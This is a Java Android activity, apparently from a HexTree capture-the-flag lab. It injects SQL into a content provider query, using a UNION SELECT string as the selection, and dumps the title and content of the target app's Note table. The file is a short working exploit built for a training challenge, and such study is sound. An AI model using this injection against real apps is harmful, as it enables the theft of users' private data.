package com.hextree.getflag;

import android.annotation.SuppressLint;
import android.content.Intent;
import android.database.Cursor;
import android.os.Bundle;
import android.widget.TextView;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

public class ContentProviderFlag33_2 extends AppCompatActivity {
    @Override
    protected void onCreate(@Nullable @org.jetbrains.annotations.Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Intent intent = getIntent();
//        Utils.showDialog(this, intent);
        Cursor cursor = getContentResolver().query(intent.getData(), null, "1=1 UNION SELECT title,content, NULL, NULL FROM Note--",   null, null);

        if (cursor!=null && cursor.moveToFirst()) {
            StringBuilder sb = new StringBuilder();
            do {
                for (int i = 0; i < cursor.getColumnCount(); i++) {
                    if (sb.length() > 0 && i != 0) {
                        sb.append(", ");
                    }
                    sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
                }
                sb.append("\n");
            } while (cursor.moveToNext());
            Utils.dumpQuery(ContentProviderFlag33_2.this, sb.toString());
        }
    }
}
